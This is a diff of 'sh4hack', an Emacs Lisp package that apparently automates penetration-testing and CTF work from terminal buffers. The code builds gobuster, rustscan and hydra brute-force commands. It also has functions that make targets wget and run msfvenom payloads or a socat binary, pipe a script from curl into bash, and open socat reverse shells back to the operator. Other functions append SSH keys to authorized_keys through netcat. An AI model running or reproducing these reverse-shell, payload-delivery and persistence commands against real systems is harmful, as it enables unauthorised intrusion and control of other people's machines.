@@ -8,14 +8,15 @@
 
 (require 'multi-term)
 (require 'hydra)
-(require 'sh4hack-keybinds)
+(require 'sh4hack-multi-term-extensions)
+(require 'sh4hack-keybindings)
 
 (fset 'sh (symbol-function 'shell-command-to-string))
 
 (defgroup sh4hack nil
   "Group for sh4hack")
 
-(defcustom sh4h-conf-dir "$HOME/.emacs.d/sh4hack"
+(defcustom sh4h-conf-dir "~/.emacs.d/sh4hack"
   "The default directory for sh4hack configuration."
   :type 'string
   :group 'sh4hack)
@@ -35,22 +36,53 @@
   :type 'string
   :group 'sh4hack)
 
-(defconst async-buffer-name "*Async shell command*")
+(setq sh4h-command-alist
+  '(
+    (gobuster-file . "gobuster dir -u http://$rhost -w $wordlist -t 100 -x php,txt -o gobuster/$output.out -k -r -q")
+    (gobuster-dir . "gobuster dir -u http://$rhost -w $wordlist -t 100 -o gobuster/$output.out -k -r -q")
+    (gobuster-vhost . "gobuster vhost -u http://$rhost -w $wordlist -t 100 -o gobuster/$output.out -k -r -q")
+    (rustscan-all . "ports=$(rustscan -a $rhost -b 1000 -r 0-65535 -t 5000 -- --min-rate 10000 -oN rustscan/all.out | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//)")
+    (rustscan-ports . "rustscan -a $rhost -b 1000 -p $ports -t 5000 -- --min-rate 10000 -sV --script=vuln -oN rustscan/ports.out")
+    (hydra-normal . "hydra $wordlist $rhost http -t 100")
+    (hydra-get . "hydra $wordlist $rhost http-get \"[REQUEST PATH]\"")
+    (hydra-post . "hydra $wordlist $rhost http-post-form \"[REQUEST PATH]:[REQUEST BODY]:[ERROR MESSAGE]\"")
+    ))
+
+(setq sh4h-wordlist-path-alist
+  '(
+    (file . "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt")
+    (dir . "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt")
+    (vhost . "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")
+    (user . "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")
+    (password . "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt")
+    ))
+
+(setq sh4h-wordlist-syntax-alist
+  '(
+    (hydra-none . "-l $user -p $password")
+    (hydra-user . "-L $user -p $password")
+    (hydra-password . "-l $user -P $password")
+    (hydra-user-password . "-L $user -P $password")
+    ))
+
+(defconst async-buffer-name "*Async Shell Command*")
 (defconst buffer-not-found-error-message "Selected buffer not found.")
 (defconst process-not-found-error-message "No process running.")
-
-(defun replace-in-string (what with in)
-  (replace-regexp-in-string (regexp-quote what) with in nil 'literal))
-
-(defun get-lhost ()
-  (interactive)
-  (replace-in-string "\n" "" (sh "/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1")))
+(defconst socat-binary-url "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat")
+(defconst nc-notification-listener "nc -lp 8889")
+(defconst progress-bar-mark "■")
+(defconst progress-bar-timeout-sec 120)
 
 (defvar sh4h-user nil)
 (defvar sh4h-rhost nil)
-(defvar sh4h-lhost (get-lhost))
-(defvar sh4h-port nil)
-(defvar sh4h-term-num nil)
+(defvar sh4h-lhost nil)
+(defvar sh4h-port 22)
+(defvar sh4h-term-num 1)
+(defvar sh4h-luser nil)
+(defvar sh4h-lhostname nil)
+(defvar sh4h-term nil)
+(defvar sh4h-stty-rows nil)
+(defvar sh4h-stty-columns nil)
 
 (defmacro inc (var)
   `(setq ,var (1+ ,var)))
@@ -61,24 +93,77 @@
        ,@forms
        (shell-command-sentinel process signal))))
 
-(defmacro run (&optional term &rest forms)
+(defmacro run (term &rest forms)
   (interactive)
-  (let ((err-msg buffer-not-found-error-message))
-    `(lambda ()
-       (if (not ,term)
-	   (message ,err-msg)
-	 ,@forms))))
+  `(lambda ()
+     (if (not ,term)
+	 (message ,buffer-not-found-error-message)
+       ,@forms)))
 
-(defmacro run-and-monitor (proc sentinel &optional term &rest forms)
+(defmacro run-and-monitor (cmd sentinel &optional term &rest forms)
   (interactive)
-  (let ((err-msg buffer-not-found-error-message))
-    `(lambda ()
+  `(lambda ()
+     (let ((proc (generate-async-proc ,cmd)))
        (if (not ,term)
-	   (message ,err-msg)
-	 (if (not (process-live-p ,proc))
-	     (message ,err-msg)
-           (set-process-sentinel ,proc ,sentinel)
+	   (message ,buffer-not-found-error-message)
+	 (if (not (process-live-p proc))
+	     (message ,buffer-not-found-error-message)
+           (set-process-sentinel proc ,sentinel)
 	   ,@forms)))))
+
+;(defun set-term-info ()
+;  (interactive)
+;  (when (or (null sh4h-term) (null sh4h-stty-rows) (null sh4h-stty-columns))
+;    (sh-in-buffer (current-buffer) "clear && echo \"$(echo $TERM):$(stty -a | grep -F rows | awk '{if ( $4 == \"rows\" ){ print $5 }}'):$(stty -a | grep -F columns | awk '{if ( $6 == \"columns\" ){ print $7 }}')\" | tr -d ';'")
+;    (sleep-for 1)
+;    (term-line-mode)
+;    (let* ((beg (progn (previous-line) (beginning-of-line) (point)))
+;	   (end (progn (end-of-line) (point)))
+;	   (output (buffer-substring-no-properties beg end))
+;	   (list (split-string output "\:")))
+;      (setq sh4h-term (car list))
+;      (setq sh4h-stty-rows (cadr list))
+;      (setq sh4h-stty-columns (car (last list))))
+;    (term-char-mode)
+;    (sh-in-buffer (current-buffer) "clear")))
+
+(defun set-term-info ()
+  (interactive)
+  (when (or (null sh4h-term) (null sh4h-stty-rows) (null sh4h-stty-columns))
+    (sh-in-buffer (current-buffer) "clear && echo \"$(whoami):$(hostname):$(echo $TERM):$(stty -a | grep -F rows | awk '{if ( $4 == \"rows\" ){ print $5 }}'):$(stty -a | grep -F columns | awk '{if ( $6 == \"columns\" ){ print $7 }}')\" | tr -d ';'")
+    (sleep-for 1)
+    (term-line-mode)
+    (let* ((beg (progn (previous-line) (beginning-of-line) (point)))
+	   (end (progn (end-of-line) (point)))
+	   (output (buffer-substring-no-properties beg end))
+	   (list (split-string output "\:")))
+      (setq sh4h-luser (car list))
+      (setq sh4h-lhostname (car (nthcdr 1 list)))
+      (setq sh4h-term (car (nthcdr 2 list)))
+      (setq sh4h-stty-rows (car (nthcdr 3 list)))
+      (setq sh4h-stty-columns (car (last list))))
+    (term-char-mode)
+    (sh-in-buffer (current-buffer) "clear")))
+
+(defun run-after-conn-established (buffer &optional if-msf)
+  (interactive)
+  (when (null if-msf)
+    (sh-in-buffer buffer "cd ~")
+    (sh-in-buffer buffer (format "export SHELL=bash; export TERM=%s" sh4h-term))
+    (sh-in-buffer buffer (format "stty rows %s columns %s" sh4h-stty-rows sh4h-stty-columns)))
+  (kill-all-async-buffers))
+
+(defun show-progress (buffer &optional user)
+  (interactive)
+  (let ((counter 0)
+	(progress-bar progress-bar-mark)
+	(prompt-regexp (get-prompt-regexp user)))
+    (while (and (not (connection-establish-p buffer prompt-regexp)) (< counter progress-bar-timeout-sec))
+      (sleep-for 1)
+      (message "Progress: %s" progress-bar)
+      (setq progress-bar (concat progress-bar progress-bar-mark))
+      (inc counter))
+    (< counter progress-bar-timeout-sec)))
 
 (defun ssh-with-public-key ()
   (interactive)
@@ -90,9 +175,7 @@
 
 (defun register-public-key (rhost)
   (interactive)
-  (if rhost
-      (transfer-script rhost "~/.ssh/id_rsa.pub")
-    (transfer-script (get-rhost) "~/.ssh/id_rsa.pub")))
+  (transfer-script rhost "~/.ssh/id_rsa.pub"))
 
 (defun generate-ssh-conf (user rhost port)
   (interactive)
@@ -102,45 +185,147 @@
   (interactive)
   (sh (format "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa <<< y -N '' -C %s@%s -q" user rhost)))
 
+(defun check-read-string (orig-fun &rest args)
+  (interactive)
+  (let ((res (apply orig-fun args)))
+    (message "check-read-string")
+    (unless (zerop (length res)) res)))
+
+(advice-add 'read-string :around #'check-read-string)
+
 (defun read-user ()
   (interactive)
-  (setq sh4h-user (read-string "User?: ")))
+  (setq sh4h-user (read-string "User?: " sh4h-user nil nil)))
 
 (defun read-rhost ()
   (interactive)
-  (setq sh4h-rhost (read-string "Rhost?: ")))
+  (setq sh4h-rhost (read-string "Rhost?: " sh4h-rhost nil nil)))
+
+(defun read-integer (prompt initial-input default-value)
+  (interactive)
+  (let ((default-val-str (number-to-string default-value))
+	(_prompt (replace-in-string ":" (format " (default %s):" default-value) prompt)))
+    (string-to-number (read-string _prompt (number-to-string initial-input) nil default-val-str))))
 
 (defun read-port ()
   (interactive)
-  (setq sh4h-port (read-string "Port?: " nil nil 22)))
+  (setq sh4h-port (read-integer "Port?: " sh4h-port 22)))
 
 (defun read-term-num ()
   (interactive)
-  (setq sh4h-term-num (read-string "*terminal<?>*: " nil nil 1)))
+  (setq sh4h-term-num (read-integer "*terminal<?>*: " sh4h-term-num 1)))
 
 (defun get-user ()
   (interactive)
-  (unless sh4h-user
+  (if (null sh4h-user)
     (read-user))
   sh4h-user)
 
 (defun get-rhost ()
   (interactive)
-  (unless sh4h-rhost
+  (if (null sh4h-rhost)
     (read-rhost))
   sh4h-rhost)
 
-(defun get-port ()
+(defun get-lhost ()
   (interactive)
-  (unless sh4h-port
-    (read-port))
-  sh4h-port)
+  (let ((lhost (replace-in-string "\n" "" (sh "/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1"))))
+    (if (not (string= lhost "Device \"tun0\" does not exist."))
+	(progn (setq sh4h-lhost lhost)
+	       (message "VPN setup is successfully completed."))
+      (message "VPN setup is on the process.")
+      (sleep-for 5)
+      (get-lhost))))
 
-(defun get-term-num ()
+(defun replace-in-string (what with in)
+  (replace-regexp-in-string (regexp-quote what) with in nil 'literal))
+
+(defun string-include-p (substr str)
   (interactive)
-  (unless sh4h-term-num
-    (read-term-num))
-  sh4h-term-num)
+  (string-match-p (regexp-quote substr) str))
+
+;(defun convert-string-to-symbol (str)
+;  (interactive)
+;  (car (read-from-string str)))
+
+(defun get-snippet (key alist-var)
+  (interactive)
+  (cdr (assoc (if (stringp key) (intern key) key) alist-var)))
+
+(defun extract-file-name-from-abs-path (path)
+  (interactive)
+  (car (last (split-string path "/"))))
+
+(defun join-with-hyphen (&rest args)
+  (interactive)
+  (mapconcat (lambda (arg) (cond ((stringp arg) arg)
+				 ((symbolp arg) (symbol-name arg))
+				 ((integerp arg) (number-to-string arg)))) args "-"))
+
+;(defun empty-string-p (string)
+;  (or (null string)
+;      (zerop (length (string-trim string)))))
+
+(defun select-wordlist (wlist-path type)
+  (interactive)
+  (if (null wlist-path) wlist-path
+    (let* ((file (extract-file-name-from-abs-path wlist-path))
+	   (dir (replace-in-string file "" wlist-path))
+	   (buf (find-file dir))
+	   (path nil))
+      (setq path (read-file-name (format "%s list?: " type) wlist-path nil t))
+      (kill-buffer buf)
+      (if (string-empty-p path) wlist-path path))))
+
+(defun get-snippet-with-single-wlist (cmd subcmd cmd-snippet)
+  (interactive)
+  (let* ((default-path (get-snippet subcmd sh4h-wordlist-path-alist))
+	 (selected-path (select-wordlist default-path subcmd))
+	 (file (extract-file-name-from-abs-path selected-path))
+	 (snippet (replace-in-string "$output" file cmd-snippet)))
+    (replace-in-string "$wordlist" selected-path snippet)))
+
+(defun get-snippet-with-multi-wlists (cmd subcmd cmd-snippet)
+  (interactive)
+  (let* ((wlist-path nil)
+	 (wlist-type (completing-read
+		      "Wordlist type? (user/password/user-password/none): "
+		      '(("user" 1) ("password" 2) ("user-password" 3) ("none" 4))
+		      nil t nil nil "password"))
+	 (wlist-type-list (split-string wlist-type "-"))
+	 (wlist-type-list-car nil)
+	 (wlist-syntax (get-snippet (join-with-hyphen cmd wlist-type) sh4h-wordlist-syntax-alist))
+	 (snippet (replace-in-string "$output" (join-with-hyphen cmd subcmd) cmd-snippet)))
+    (while wlist-type-list
+      (setq wlist-type-list-car (car wlist-type-list))
+      (setq wlist-path (select-wordlist (get-snippet wlist-type-list-car sh4h-wordlist-path-alist) wlist-type-list-car))
+      (setq wlist-syntax (replace-in-string (format "$%s" wlist-type-list-car) wlist-path wlist-syntax))
+      (setq wlist-type-list (cdr wlist-type-list)))
+    (replace-in-string "$wordlist" wlist-syntax snippet)))
+  
+(defun get-snippet-with-wordlist (cmd subcmd list-type cmd-snippet)
+  (interactive)
+  (if (string= 'multi list-type)
+      (get-snippet-with-multi-wlists cmd subcmd cmd-snippet)
+    (get-snippet-with-single-wlist cmd subcmd cmd-snippet)))
+
+(defun get-command-snippet (cmd subcmd &optional list-type)
+  (interactive)
+  (let* ((cmd-name (join-with-hyphen cmd subcmd))
+	 (cmd-snippet (get-snippet cmd-name sh4h-command-alist)))
+    (when (string-include-p "$rhost" cmd-snippet)
+      (setq cmd-snippet (replace-in-string "$rhost" (get-rhost) cmd-snippet)))
+    (when (string-include-p "$lhost" cmd-snippet)
+      (setq cmd-snippet (replace-in-string "$lhost" (get-lhost) cmd-snippet)))
+    (when (string-include-p "$wordlist" cmd-snippet)
+      (setq cmd-snippet (get-snippet-with-wordlist cmd subcmd list-type cmd-snippet)))
+    cmd-snippet))
+
+(defun run-from-snippet (cmd subcmd &optional list-type)
+  (interactive)
+  (let* ((cmd-snippet (get-command-snippet cmd subcmd list-type))
+	 (prompt (format "Command (%s):\n" (join-with-hyphen cmd subcmd))))
+    (sh-in-buffer (get-term-buffer) (read-string prompt cmd-snippet))))
 
 (defun register-info ()
   (interactive)
@@ -152,27 +337,30 @@
 
 (defun get-info ()
   (interactive)
-  (message (format "User: %s\nRhost: %s\nLhost: %s\nPort: %s\nTerm Num: %s\n" sh4h-user sh4h-rhost sh4h-lhost sh4h-port sh4h-term-num)))
+  (message (format "User: %s\nRhost: %s\nLhost: %s\nPort: %s\nTerm Num: %s" sh4h-user sh4h-rhost sh4h-lhost sh4h-port sh4h-term-num)))
+
+;(defun get-info ()
+;  (interactive)
+;  (message (format "User: %s\nRhost: %s\nLhost: %s\nPort: %s\nTerm num: %s, type: %s, stty-rows: %s, stty-columns: %s" sh4h-user sh4h-rhost sh4h-lhost sh4h-port sh4h-term-num sh4h-term sh4h-stty-rows sh4h-stty-columns)))
 
 (defun prepare-ssh-key ()
   (interactive)
   (let ((user (get-user))
-	(rhost (get-rhost))
-	(port (get-port)))
+	(rhost (get-rhost)))
     (generate-ssh-key user rhost)    
-    (generate-ssh-conf user rhost port)
+    (generate-ssh-conf user rhost sh4h-port)
     (register-public-key rhost)))
 
 (defun auth-with-password ()
   (interactive)
-  (ssh-with-password (get-user) (get-rhost) (get-port)))
+  (ssh-with-password (get-user) (get-rhost) sh4h-port))
 
 (defun auth-with-public-key ()
   (interactive)
   (let ((term (get-term-buffer)))
     (funcall (run term
 		  (if (y-or-n-p "Generate ssh key pair?: ")
-		      (progn (start-remote-listener term t)
+		      (progn (start-remote-listener term)
 			     (prepare-ssh-key)
 			     (ssh-with-public-key))
 		    (ssh-with-public-key))))))
@@ -182,6 +370,12 @@
   (comint-send-string
    (get-buffer-process buffer)
    (concat command-string "\n")))
+
+;(defun sh-in-buffer (command-string &optional buffer)
+;  (interactive)
+;  (comint-send-string
+;   (get-buffer-process (if (null buffer) (current-buffer) buffer))
+;   (concat command-string "\n")))
 
 (defun get-buffer-list (buf-name-prefix)
   (interactive)
@@ -201,18 +395,20 @@
       (get-term-buffer-by-num sh4h-term-num)
     (let ((buf (generate-new-buffer "*terminals*")))
       (switch-to-buffer buf)
-      (insert "****** terminals ******\n")
+      (insert "****** terminals ******\n\n")
       (insert (concat-string-list (get-buffer-list "*terminal<")))
       (let ((term (get-term-buffer-by-num (read-term-num))))
         (kill-buffer buf)
         term))))
 
-(defun start-remote-listener (buffer &optional if-pubkey)
+(defun get-multi-term-buffer ()
+  (interactive)
+  (get-buffer (buffer-name (multi-term))))
+
+(defun start-remote-listener (buffer)
   (interactive)
   (when buffer
-    (if if-pubkey
-	(sh-in-buffer buffer "nc -lp 7777 >> \"${HOME}/.ssh/authorized_keys\"")
-      (sh-in-buffer buffer "nc -lp 7777 > /tmp/script.sh && chmod +x /tmp/script.sh && . /tmp/script.sh"))))
+    (sh-in-buffer buffer "nc -lp 7777 >> \"${HOME}/.ssh/authorized_keys\"")))
 
 (defun get-process-num (cmd-str)
   (interactive)
@@ -220,7 +416,11 @@
 
 (defun process-exists-p (cmd-str)
   (interactive)
-  (unless (= 0 (get-process-num cmd-str)) t))
+  (not (zerop (get-process-num cmd-str))))
+
+(defun async-process-exists-p ()
+  (interactive)
+  (not (zerop (length (get-buffer-list async-buffer-name)))))
 
 (defun get-pid (process-name)
   (interactive)
@@ -232,10 +432,14 @@
     (unless (process-exists-p command)
       (async-shell-command command))))
 
+(defun kill-all-async-buffers ()
+  (interactive)
+  (kill-matching-buffers (format "^%s" async-buffer-name) nil t))
+
 (defun kill-async-buffers ()
   (interactive)
   (create-sentinel
-   (kill-matching-buffers (format "^%s" async-buffer-name) nil t)))
+   (kill-all-async-buffers)))
 
 (defun generate-async-proc (command)
   (interactive)
@@ -248,64 +452,79 @@
   (interactive)
   (sh (format "nc -w 3 %s 7777 < %s" rhost file-path)))
 
-(defun process-listen-p (port)
+;(defun process-listen-p (port)
+;  (interactive)
+;  (string= 'LISTEN (sh (format "netstat -lt | grep -iF %s | awk '{print $6}'" port))))
+
+;(defun process-establish-p (port)
+;  (interactive)
+;  (not (string-empty-p (sh (format "netstat -at | grep -iE \"%s:%s.*%s.*ESTABLISHED\"" sh4h-lhost port sh4h-rhost)))))
+
+(defun connection-establish-p (buffer prompt-regexp)
   (interactive)
-  (when (string= 'LISTEN (sh (format "netstat -tl | grep -iE %s | awk '{print $6}'" port)))))
+  (with-current-buffer buffer
+    (not (null (search-backward-regexp prompt-regexp nil t nil)))))
 
 (defun port-in-use-p (port)
   (interactive)
-  (unless (= 0 (length (sh (format "lsof -i:%s" port))))
-    t))
+  (not (zerop (length (sh (format "lsof -i:%s" port))))))
 
 (defun get-free-port (start end)
   (let ((port start))
     (while (and (port-in-use-p port) (< port end))
       (message "Port %s is in use..." port)
       (inc port))
-    (when (< port end)
-      port)))
+    (when (< port end) port)))
 
-(defun await-socat-connection (term port)
+(defun get-prompt-regexp (&optional user)
   (interactive)
-  (create-sentinel
-   (let ((counter 0))
-     (while (and (process-listen-p port) (< counter 10))
-       (message "Socat is listening on %s..." port)
-       (sleep-for 1)
-       (inc counter))
-     (when (< counter 10)
-       (kill-matching-buffers (format "^%s" async-buffer-name) nil t)
-       (sh-in-buffer term "cd ~")
-       (sh-in-buffer term "export SHELL=bash; export TERM=eterm-color")
-       (sh-in-buffer term "stty rows 60 columns 126")))))
+  (if (null user) "meterpreter >" (format "%s@.+:.+\$" user)))
+
+(defun async-fetch-socat ()
+  (interactive)
+  (let* ((cmd (format "ls %s/socat || wget %s -O %s/socat && chmod +x %s/socat" sh4h-www-dir socat-binary-url sh4h-www-dir sh4h-www-dir))
+	 (proc (async-start
+		`(lambda () (shell-command ,cmd))
+		'ignore)))
+    (async-wait proc)))
 
 (defun connect-with-socat ()
   (interactive)
-  (let* ((term (get-term-buffer))
-	 (mterm (multi-term))
+  (let* ((mterm (moniter-buffer-in-multi-thread))
+	 (term (get-term-buffer))
 	 (port (get-free-port 8500 8600))
-	 (lcmd (format ". %s/banner.sh && { ls %s/socat || { wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O %s/socat && chmod +x %s/socat; } } && %s/socat file:`tty`,raw,echo=0 TCP-L:%s" sh4h-scripts-dir sh4h-www-dir sh4h-www-dir sh4h-www-dir sh4h-www-dir port))
-	 ;(rcmd (format "FILE=$(cd /tmp && wget http://%s/socat 2>&1 | grep Saving | cut -d ' ' -f 3 | sed -e 's/[^A-Za-z0-9._-]//g') && chmod +x /tmp/$FILE && { { sleep 1 && nc -z -w 3 %s 8889; } & } && { /tmp/$FILE exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost sh4h-lhost port))
-	 ;(rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { { sleep 1 && nc -z -w 3 %s 8889; } & } && { ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost sh4h-lhost port))
-         (rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { { nc -z -w 3 %s 8889 && ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s; } & } && cd ~" sh4h-lhost sh4h-lhost sh4h-lhost port))
-	 (proc (generate-async-proc "nc -lp 8889")))
-    (funcall (run-and-monitor proc
-		              (await-socat-connection mterm port)
-		              term
-		              (start-web-server)
-		              (sh-in-buffer mterm lcmd)
-		              (sh-in-buffer term rcmd)))))
+	 (lcmd (format ". %s/banner.sh && %s/socat file:`tty`,raw,echo=0 TCP-L:%s" sh4h-scripts-dir sh4h-www-dir port))
+	 (rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost port)))
+    (funcall (run term
+		  (start-web-server)
+		  (async-fetch-socat)
+		  (sh-in-buffer mterm lcmd)
+		  (sh-in-buffer term rcmd)))))
 
 (defun inspect-server ()
   (interactive)
   (let ((term (get-term-buffer))
-	(rcmd (format "cd /tmp && { ls inspect.sh >/dev/null 2>&1 || { wget http://%s/inspect.sh && chmod +x inspect.sh; } } && ./inspect.sh && cd ~ && { nc -z -w 3 %s 8889 & }" sh4h-lhost sh4h-lhost))
-	(proc (generate-async-proc "nc -lp 8889")))
-    (funcall (run-and-monitor proc
+	(rcmd (format "curl -s http://%s/inspect.sh | bash && { nc -z -w 3 %s 8889 & }" sh4h-lhost sh4h-lhost)))
+    (funcall (run-and-monitor nc-notification-listener
 			      (kill-async-buffers)
 			      term
 			      (start-web-server)
 			      (sh-in-buffer term rcmd)))))
+
+;(defun upgrade-netcat ()
+;  (interactive)
+;  (let ((term (get-term-buffer))
+;	(kill-buffer-query-functions nil))
+;    (funcall (run term
+;		  (sh-in-buffer term "python3 -c \"import pty;pty.spawn('/bin/bash')\"")
+;                  (sleep-for 1)
+;                  (sh-in-buffer (multi-term) (format "kill -s STOP %s" (get-pid "rlwrap nc -lvnp 4444")))
+;                  (sleep-for 1)
+;                  (kill-buffer)
+;                  (switch-to-buffer term)
+;                  (sh-in-buffer term "stty raw -echo; fg")
+;                  (sleep-for 1)
+;                  (sh-in-buffer term "echo '[*] Netcat shell is successfully upgraded.\n'")))))
 
 (defun upgrade-netcat ()
   (interactive)
@@ -314,23 +533,32 @@
     (funcall (run term
 		  (sh-in-buffer term "python3 -c \"import pty;pty.spawn('/bin/bash')\"")
                   (sleep-for 1)
-                  (sh-in-buffer (multi-term) (format "kill -s STOP %s" (get-pid "rlwrap nc -lvnp 4444")))
-                  (sleep-for 1)
-                  (kill-buffer)
+                  (sh-in-buffer (multi-term) (format "kill -s STOP %s" (get-pid (format "nc -lvnp %s" (read-string "Listening port?: " nil nil 4444)))))
+                  (sleep-for 2)
+                  ;(kill-buffer)
                   (switch-to-buffer term)
                   (sh-in-buffer term "stty raw -echo; fg")
                   (sleep-for 1)
-                  (sh-in-buffer term "echo '[*] Netcat shell is successfully upgraded.\n'")))))
+		  ;(sh-in-buffer term "reset")		  
+		  (sh-in-buffer term "export SHELL=bash; export TERM=%s" sh4h-term)
+		  (sleep-for 1)
+		  (sh-in-buffer term "stty rows %s columns %s" sh4h-stty-rows sh4h-stty-columns)
+		  (sleep-for 1)
+                  (sh-in-buffer term "echo '[*] Netcat shell is successfully upgraded.\n'")
+		  ))))
 
 (defun mold-lhost-ip ()
   (interactive)
   (replace-in-string "." "" sh4h-lhost))
 
-(defun generate-exploit (payload exp-name lport ext)
+(defun async-generate-exploit (payload exp-name lport ext)
   (interactive)
-  (message "generate-exploit exp-name: %s" exp-name)
-  (let ((exp-path (format "%s/%s" sh4h-www-dir exp-name)))
-    (sh (format "ls %s >/dev/null 2>&1 || msfvenom -p %s LHOST=%s LPORT=%s -o %s -f %s" exp-path payload sh4h-lhost lport exp-path ext))))
+  (let* ((exp-path (format "%s/%s" sh4h-www-dir exp-name))
+	 (cmd (format "ls %s >/dev/null 2>&1 || msfvenom -p %s LHOST=%s LPORT=%s -o %s -f %s" exp-path payload sh4h-lhost lport exp-path ext))
+	 (proc (async-start
+		`(lambda () (shell-command ,cmd))
+		'ignore)))
+    (async-wait proc)))
 
 (defun get-windows-payload (arch type)
   (interactive)
@@ -357,39 +585,44 @@
   (interactive)
   (let ((lhost-str (mold-lhost-ip))
 	(base-name (get-linux-exploit-base-name arch type)))
-    (format "%s-%s-%s" base-name lhost-str lport)))
+    (join-with-hyphen base-name lhost-str lport)))
 
 (defun msf-windows (arch type)
   (interactive)
   (get-windows-payload arch type))
 
-(defun msf-linux (arch type)
+(defun moniter-buffer-in-multi-thread (&optional if-msf)
   (interactive)
-  (let* ((term (get-term-buffer))
+  (let ((user (when (null if-msf) (get-user)))
+	(mterm (get-multi-term-buffer)))
+    (make-thread (lambda ()
+		   (when (show-progress mterm user)
+		     (run-after-conn-established mterm if-msf)
+		     (message "Successfully Completed!"))))
+    mterm))
+
+(defun msf-linux (arch type)
+  (interactive)  
+  (let* ((mterm (moniter-buffer-in-multi-thread t))
+	 (term (get-term-buffer))
 	 (lport 5555)
-	 (rhost (get-rhost))
 	 (payload (get-linux-payload arch type))
 	 (exp-name (get-linux-exploit-name arch type lport))
 	 (lcmd1 (format ". %s/generate-msf-rc.sh %s %s" sh4h-scripts-dir payload sh4h-lhost))
 	 (lcmd2 (format ". %s/banner.sh && msfconsole -r %s/msf.rc -q" sh4h-scripts-dir sh4h-scripts-dir))
-	 ;(rcmd (format "FILE=$(cd /tmp && wget http://%s/exploit.elf 2>&1 | grep Saving | cut -d ' ' -f 3 | sed -e 's/[^A-Za-z0-9._-]//g') && { nc -z -w 3 %s 8889 & } && chmod +x /tmp/$FILE && { /tmp/$FILE & } && cd ~" sh4h-lhost sh4h-lhost))
-	 (rcmd (format "cd /tmp && { ls %s >/dev/null 2>&1 || { wget http://%s/%s && chmod +x %s; } } && { ./%s & } && cd ~ && { nc -z -w 3 %s 8889 & }" exp-name sh4h-lhost exp-name exp-name sh4h-lhost exp-name))
-	 (proc (generate-async-proc "nc -lp 8889")))
-    (funcall (run-and-monitor proc
-		              (kill-async-buffers)
-		              term
-			      (start-web-server)
-			      (generate-exploit payload exp-name lport 'elf)
-	                      (sh lcmd1)
-                              (sh-in-buffer (multi-term) lcmd2)
-                              (sh-in-buffer term rcmd)))))
+	 (rcmd (format "cd /tmp && { ls %s >/dev/null 2>&1 || { wget http://%s/%s && chmod +x %s; } } && { ./%s & } && cd ~" exp-name sh4h-lhost exp-name exp-name exp-name)))
+    (funcall (run term
+		  (start-web-server)
+		  (async-generate-exploit payload exp-name lport 'elf)
+	          (sh lcmd1)
+                  (sh-in-buffer mterm lcmd2)
+                  (sh-in-buffer term rcmd)))))
 
 (defun after-save-remote-file (file path term)
   (interactive)
-  (let* ((rcmd (format "{ nc -lp 10000 > %s && echo '[*] %s is written successfully!\n' && nc -z -w 3 %s 8889; } || echo '[*] No write permission for file or dir...\n'" file file sh4h-lhost))
-	 (acmd (format "nc -w 3 %s 10000 < %s" (get-rhost) path))
-	 (proc (generate-async-proc "nc -lp 8889")))
-    (funcall (run-and-monitor proc
+  (let ((rcmd (format "{ nc -lp 10000 > %s && echo '[*] %s is written successfully!\n' && nc -z -w 3 %s 8889; } || echo '[*] No write permission for file or dir...\n'" file file sh4h-lhost))
+	(acmd (format "nc -w 3 %s 10000 < %s" (get-rhost) path)))
+    (funcall (run-and-monitor nc-notification-listener
 			      (kill-async-buffers)
 			      'term
 			      (remove-hook 'after-save-hook (apply-partially #'after-save-remote-file file path term))
@@ -406,13 +639,44 @@
 (defun edit-remote-file ()
   (interactive)
   (let* ((term (get-term-buffer))
-   	 (file (read-string "File?: "))
+   	 (file (read-file-name "File?: "))
    	 (path (format "%s/%s" sh4h-rfiles-dir file))
-   	 (rcmd (format "nc -w 3 %s 9999 < %s" sh4h-lhost file))
-   	 (proc (generate-async-proc (format "nc -lp 9999 > %s" path))))
-    (funcall (run-and-monitor proc
+   	 (rcmd (format "nc -w 3 %s 9999 < %s" sh4h-lhost file)))
+    (funcall (run-and-monitor (format "nc -lp 9999 > %s" path)
 			      (after-remote-file-transfer file path term)
 			      term
 			      (sh-in-buffer term rcmd)))))
 
+(defun run-remotely (term file)
+  (interactive)
+  (let ((rcmd (format "cd /tmp && wget %s/%s && nc -z -w 3 %s 8889 && chmod +x %s && ./%s" sh4h-lhost file sh4h-lhost file file)))
+    (funcall (run-and-monitor nc-notification-listener
+			      (kill-async-buffers)
+			      term
+			      (start-web-server)
+			      (sh-in-buffer term rcmd)))))
+
+(defun run-remotely-and-output-locally (term file)
+  (interactive)
+  (let ((lcmd (format "nc -lvnp 9002 | tee %s/%s.out" sh4h-rfiles-dir file))
+	(rcmd (format "cd /tmp && wget %s/%s && nc -z -w 3 %s 8889 && chmod +x %s && ./%s | nc -w 3 %s 9002" sh4h-lhost file sh4h-lhost file file sh4h-lhost)))
+    (funcall (run-and-monitor nc-notification-listener
+			      (kill-async-buffers)
+			      term
+			      (start-web-server)
+			      (sh-in-buffer (get-multi-term-buffer) lcmd)
+			      (sh-in-buffer term rcmd)))))
+
+(defun run-script-remotely ()
+  (interactive)
+  (let* ((term (get-term-buffer))
+   	 (path (expand-file-name (read-file-name "File?: ")))
+	 (file (extract-file-name-from-abs-path path)))
